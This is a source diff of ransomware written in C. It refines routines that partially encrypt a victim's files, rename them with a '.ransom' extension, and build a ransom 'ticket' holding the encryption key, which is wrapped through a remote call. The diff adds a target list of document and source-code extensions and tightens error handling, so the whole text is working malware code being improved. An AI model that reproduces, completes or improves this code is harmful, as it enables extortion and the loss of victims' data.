@@ -9,8 +9,7 @@
 #include <stdlib.h>
 #include <stdbool.h>
 
-int encryptSymmetricKey(char **encrypted_key, const int pubkeyid,
-			const char *keyiv)
+int encryptSymmetricKey(char **encrypted_key, const int pubkeyid, const char *keyiv)
 {
 	//Get key in hex
 	char *hexkey =
@@ -41,7 +40,11 @@ int encryptSymmetricKey(char **encrypted_key, const int pubkeyid,
 
 	//Get encrypted key
 	int ret = decryptRemoteBytes(encrypted_key, url);
-
+	if(ret==-1){
+		fprintf(stderr, "Error: encryptSymmetricKey: decryptRemoteBytes failed (%s)\n", hexkey);
+		return -1;
+	}
+	
 	//Deallocate memory and return encrypted key size
 	free(url);
 	free(hexkey);
@@ -67,15 +70,15 @@ bool partialEncryptFile(const char *keyiv, const char *filename,
 	    file_size > number_of_bytes ? number_of_bytes : file_size;
 
 	//Read bytes for encryption
-	char *plaintext = (char *) malloc(sizeof(char) * number_of_bytes);
+	char plaintext[MAX_BYTES_TO_ENCRYPT];
 	fread(plaintext, 1, number_of_bytes, hostage);
 
 	//Encrypt bytes
-	char *ciphertext = (char *) malloc(sizeof(char) * number_of_bytes);
+	char ciphertext[MAX_BYTES_TO_ENCRYPT];
 	if (decrypt)
-		symEncrypt(&ciphertext, keyiv, plaintext, number_of_bytes);
+		symEncrypt(ciphertext, keyiv, plaintext, number_of_bytes);
 	else
-		symDecrypt(&ciphertext, keyiv, plaintext, number_of_bytes);
+		symDecrypt(ciphertext, keyiv, plaintext, number_of_bytes);
 
 	//Close then open to write
 	fclose(hostage);
@@ -90,8 +93,6 @@ bool partialEncryptFile(const char *keyiv, const char *filename,
 	}
 	//cleanup
 	fclose(hostage);
-	free(plaintext);
-	free(ciphertext);
 	return 1;
 
 }
@@ -111,7 +112,8 @@ bool decryptDirectory(const char *keyiv, const char *directory)
 			    (keyiv, ls[i], MAX_BYTES_TO_ENCRYPT, 1)) {
 
 				//Remove ".ransom" file extension
-				char *temp = realloc(sub, strlen(ls[i]));
+				char *temp =
+				    (char *) realloc(sub, strlen(ls[i]));
 				if (temp != NULL) {
 					sub = temp;
 					strncpy(sub, ls[i],
@@ -152,16 +154,38 @@ bool decryptDirectory(const char *keyiv, const char *directory)
 bool encryptDirectory(const char *keyiv, const char *directory)
 {
 	char **ls = walkDir(directory);
-
+	const char* vulnerable_types[]={
+	//Office
+	".doc\0", ".docx\0",".odt\0", ".ppt\0",".txt\0"
+	//Programming
+	".c\0",".js\0",".cpp\0",".h\0",".java\0",".py\0",".pyw\0",".ruby\0",".perl\0",".php\0",".html\0",".coffee\0",".hpp\0",".sh\0",".bat\0",".ps\0",".makefile\0",".cmd\0",".gitignore\0", ".m\0", ".mm\0",
+	"\0"};
+	
 	//encrypt directory
-	char *newfname;
+	char *newfname=(char *)malloc(1);
 	for (int i = 0; strcmp(ls[i], "\0"); i++) {
+		
+		//go through list of vulnerable file types
+		bool vulnerable=false;
+		if(strrchr(ls[i], '.') != NULL){
+			for(unsigned int j = 0; vulnerable_types[j][0]!='\0'; j++){
+				if(!strcmp(vulnerable_types[j],strrchr(ls[i], '.'))){
+					vulnerable=true;
+					break;
+				}
+			}
+		}else{
+			vulnerable=true;
+		}
+		if(!vulnerable)continue;
+		
 		//Partial encrypt ls[i]
 		if (!partialEncryptFile(keyiv, ls[i],
 					MAX_BYTES_TO_ENCRYPT, 0)) {
 			printf
-			    ("Warning: encryptDirectory: partialEncryptFile failed\n");
+				("Warning: encryptDirectory: partialEncryptFile failed\n");
 		}
+		
 		//Append '.ransom' to filename
 		newfname =
 		    (char *) malloc(strlen(ls[i]) +
@@ -182,11 +206,9 @@ bool encryptDirectory(const char *keyiv, const char *directory)
 		free(ls[i++]);
 	free(ls[i]);
 
-
 	//Free pointers
 	free(ls);
 	free(newfname);
-
 	return 1;
 }
 
@@ -200,9 +222,14 @@ bool makeTicket(const char *keyiv, const char *directory)
 	int encrypted_key_size =
 	    encryptSymmetricKey(&encrypted_key, keyid, keyiv);
 
+	if(encrypted_key_size==-1){
+		fprintf(stderr, "Error: makeTicket: encryptSymmetricKey failed\n");
+		return 0;
+	}
+		
 	//Make raw ticket
 	char *raw_ticket = (char *) malloc(2 + encrypted_key_size);
-	raw_ticket[0] = keyid / 256;	//Note: this means max keyid is 2^16-1
+	raw_ticket[0] = keyid / 256;
 	raw_ticket[1] = keyid % 256;	//Pretty large if you ask me
 	for (int i = 0; i < encrypted_key_size; i++)
 		raw_ticket[i + 2] = encrypted_key[i];
